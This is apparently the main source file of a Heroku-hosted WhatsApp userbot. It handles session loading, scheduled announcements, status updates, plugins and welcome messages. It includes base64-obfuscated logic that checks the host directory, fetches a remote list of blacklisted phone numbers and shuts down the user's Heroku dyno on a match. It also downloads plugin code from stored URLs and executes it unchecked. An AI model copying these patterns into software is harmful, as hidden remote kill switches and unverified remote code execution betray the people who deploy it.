const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./Raganork/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsenaDuplicated', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '905511384572,0' }
// Yaln谋zca bir kolayl谋k. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var ddd = ggg.toString('utf-8')
    clh.pay = ddd
    const conn = new WAConnection();
    const Session = new StringSession();
    conn.version = [2,2121,7];
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        await axios.get('https://gist.githubusercontent.com/souravkl11/1df3eeb29415b94c119c6d459ce9ee6e/raw').then(async (ann) => {
            const { infotr, infoen, infoes, infopt, infoid, infoaz, infohi, infoml, inforu} = ann.data.announcements          
            if (infotr !== '' && config.LANG == 'TR') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```G眉nl眉k Duyurular``` ]\n\n' + infotr.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoaz !== '' && config.LANG == 'AZ') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```G眉nd蓹lik Elanlar``` ]\n\n' + infoaz.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoes !== '' && config.LANG == 'ES') {
                while (getGMTh == 18 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```Anuncios Diarios``` ]\n\n' + infoes.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoen !== '' && config.LANG == 'EN') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```Daily Announcements``` ]\n\n' + infoen.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infohi !== '' && config.LANG == 'HI') {
                while (getGMTh == 21 && getGMTm == 31) { 
                    return conn.sendMessage(conn.user.jid, '[ ```啶︵啶ㄠた啶� 啶樴啶粪ぃ啶距啶俙`` ]\n\n' + infohi.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoml !== '' && config.LANG == 'ML') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```啻祶啻班搐啻苦处啻苦川 啻祶啻班礀嗟嵿疮啻距椽啻ㄠ礄嗟嵿礄嗟綻`` ]\n\n' + infoml.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoid !== '' && config.LANG == 'ID') {
                while (getGMTh == 23 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```Pengumuman Harian``` ]\n\n' + infoid.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (inforu !== '' && config.LANG == 'RU') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```袝卸械写薪械胁薪褘械 芯斜褗褟胁谢械薪懈褟``` ]\n\n' + inforu.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infopt !== '' && config.LANG == 'PT') {
                while (getGMTh == 17 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ ```An煤ncios Di谩rios``` ]\n\n' + infopt.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
        })
    }, 50000);
    var biography_var = ''
    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
        biography_var = vars.AUTO_B陌O
    });
    setInterval(async () => { 
        if (biography_var == 'true') {
            if (conn.user.jid.startsWith('90')) { // Turkey
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time + '\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('994')) { // Azerbayjan
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time + '\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('94')) { // Sri Lanka
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time +'\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { // Portugal
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time + '\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { // Russia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time +'\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('91')) { // Indian
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time + '\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { // Indonesia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time +'\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { // Germany
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time + '\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) { // Australia 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time +'\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { // Brazil
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time + '\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) { // France
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time +'\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { // Spain
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time + '\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { // UK
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time +'\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) { // Italy 
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time + '\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Kazakhistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time +'\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) { // Uzbekistan 
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time + '\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { // Turkmenistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time +'\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const biography = '馃搮 ' + utch + '\n鈱� ' + ov_time +'\n\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 鉁�'
                await conn.setStatus(biography)
            }
        }
    }, 7890);
    var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw')
    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    
    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    conn.on ('open', async () => {
        console.log(
            chalk.blueBright.italic('Checking Bot Errors 鉁�')
        );
        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('鈩癸笍 Connecting to WhatsApp... Please Wait.')}`);
    });
    conn.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('鉁� Login successful!')
        );
        console.log(
            chalk.blueBright.italic('Injecting to Baileys...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('馃挒Connecting to Raganork Database...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('鉁� Final Connection Successfull!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('鈿� Raganork' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACT陌ON = config.LANG == 'TR' || config.LANG == 'AZ' ? '*WhatsAsena Chatbot Olarak 脟al谋艧谋yor!* 馃惡\n\n_Bu modun amac谋 botu tam fonksiyonel bir yapay zeka sohbet arac谋na 莽evirmektir._\n_Normal moda d枚nmek i莽in_ *.fulleva off* _komutunu kullanabilirsiniz._\n\n*WhatsAsena Kulland谋臒谋n 陌莽in Te艧ekk眉rler 馃拰*\n    *- Eva*' : '*饾檷饾櫀饾櫆饾櫀饾櫍饾櫎饾櫑饾櫊 饾檼饾櫎饾櫑饾櫊饾櫈饾櫍饾櫆 饾櫀饾櫒 饾櫀 饾樉饾櫇饾櫀饾櫓饾櫁饾櫎饾櫓! 馃挰*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Killadism never ends!*\n    *- Eva*'
        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
            await conn.sendMessage(conn.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.WORKTYPE == 'public') {
      
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACT陌ON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*WhatsAsena Public Olarak 脟al谋艧谋yor! 馃惡*\n\n_L眉tfen burada plugin denemesi yapmay谋n. Buras谋 sizin LOG numaran谋zd谋r._\n_Herhangi bir sohbette komutlar谋 deneyebilirsiniz :)_\n\n*Botunuz herkese a莽谋k bir 艧ekilde 莽al谋艧maktad谋r. De臒i艧tirmek i莽in* _.setvar WORK_TYPE:private_ *komutunu kullan谋n.*\n\n*WhatsAsena Kulland谋臒谋n 陌莽in Te艧ekk眉rler 馃拰*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '馃敻 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```G眉ncellemek 陌莽in``` *.update now* ```Yaz谋n.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACT陌ON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '\n 饾檷饾樇饾檪饾樇饾檳饾檴饾檷饾檰 饾檸饾檹饾樇饾檷饾檹饾檧饾樋 鉁匼n', MessageType.text);
                }               
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '馃敻 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
        
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For Update The Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == 'private') { 
            if (config.LANG == 'TR' || config.LANG == 'AZ') { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACT陌ON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*WhatsAsena Private Olarak 脟al谋艧谋yor! 馃惡*\n\n_L眉tfen burada plugin denemesi yapmay谋n. Buras谋 sizin LOG numaran谋zd谋r._\n_Herhangi bir sohbette komutlar谋 deneyebilirsiniz :)_\n\n*Botunuz sadece size 枚zel olarak 莽al谋艧maktad谋r. De臒i艧tirmek i莽in* _.setvar WORK_TYPE:public_ *komutunu kullan谋n.*\n\n*WhatsAsena Kulland谋臒谋n 陌莽in Te艧ekk眉rler 馃拰*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '馃敻 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```G眉ncellemek 陌莽in``` *.update now* ```Yaz谋n.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACT陌ON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '\n*饾檷饾櫀饾櫆饾櫀饾櫍饾櫎饾櫑饾櫊 饾櫑饾櫔饾櫍饾櫍饾櫈饾櫍饾櫆 饾櫀饾櫒 Private!馃槑*\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as private. To change it, use* _.setvar WORK_TYPE:public_\n\n*Killadism never ends!*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '馃敻 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Type``` *.update now* ```For The Update Bot.```\n\n' + degisiklikler + '```', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PR陌VATE' || config.WORKTYPE == ' PR陌VATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {

            if (config.LANG == 'TR' || config.LANG == 'AZ') {

                await conn.sendMessage(
                    conn.user.jid,
                    '_G枚r眉n眉艧e G枚re Private Moduna Ge莽mek 陌stiyorsun! Maalesef_ *WORK_TYPE* _Anahtar谋n Yanl谋艧!_ \n_Merak Etme! Senin 陌莽in Do臒rusunu Bulmaya 脟al谋艧谋yorum.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Private Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
        }
        else if (config.WORKTYPE == ' public' || config.WORKTYPE == 'Public' || config.WORKTYPE == ' Public' || config.WORKTYPE == 'publoc' || config.WORKTYPE == ' Publoc' || config.WORKTYPE == 'pubcli' || config.WORKTYPE == ' pubcli' || config.WORKTYPE == 'PUBL陌C' || config.WORKTYPE == ' PUBL陌C' || config.WORKTYPE == 'PUBLIC' || config.WORKTYPE == ' PUBLIC' || config.WORKTYPE == 'puvlic' || config.WORKTYPE == ' puvlic' || config.WORKTYPE == 'Puvlic' || config.WORKTYPE == ' Puvlic') {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                await conn.sendMessage(
                    conn.user.jid,
                    '_G枚r眉n眉艧e G枚re Public Moduna Ge莽mek 陌stiyorsun! Maalesef_ *WORK_TYPE* _Anahtar谋n Yanl谋艧!_ \n_Merak Etme! Senin 陌莽in Do臒rusunu Bulmaya 脟al谋艧谋yorum.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_It Looks Like You Want to Switch to Public Mode! Sorry, Your_ *WORK_TYPE* _Key Is Incorrect!_ \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
        }
        else {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_Girdi臒in_ *WORK_TYPE* _Anahtar谋 Bulunamad谋!_ \n_L眉tfen_ ```.setvar WORK_TYPE:private``` _Yada_ ```.setvar WORK_TYPE:public``` _Komutunu Kullan谋n!_', MessageType.text
                );
            }
            else {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_The_ *WORK_TYPE* _Key You Entered Was Not Found!_ \n_Please Type_ ```.setvar WORK_TYPE:private``` _Or_ ```.setvar WORK_TYPE:public```', MessageType.text
                );
            }
        }
    })
    conn.on('message-new', async msg => {
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {

            // G枚r眉艧眉r眉z Mesaj谋

            var gb = await getMessage(msg.key.remoteJid, 'goodbye');

            var blogo = await axios.get(config.GIF_BYE, { responseType: 'arraybuffer' })

            if (gb !== false) {

                await conn.sendMessage(msg.key.remoteJid, Buffer.from(blogo.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});

            }

            return;

        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {

            // Ho艧geldin Mesaj谋

            var gb = await getMessage(msg.key.remoteJid);

            var wlogo = await axios.get(config.GIF_WEL, { responseType: 'arraybuffer' })

            if (gb !== false) {

                await conn.sendMessage(msg.key.remoteJid, Buffer.from(wlogo.data), MessageType.video, {mimetype: Mimetype.gif, caption: gb.message});

            }

            return;

        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '905524317852-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
